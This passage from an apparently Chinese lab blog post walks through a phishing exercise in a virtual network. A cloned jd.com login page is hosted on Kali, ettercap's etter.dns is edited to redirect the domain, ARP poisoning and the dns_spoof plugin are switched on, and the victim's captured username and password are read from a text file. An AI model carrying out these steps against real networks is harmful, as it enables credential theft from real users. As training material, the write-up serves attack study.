<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" srcset="/img/loading.gif" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p>
<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" srcset="/img/loading.gif" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" srcset="/img/loading.gif" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2" target="_blank" rel="noopener">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" srcset="/img/loading.gif" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" srcset="/img/loading.gif" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码然后点击登录</a></p>
<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
</search>
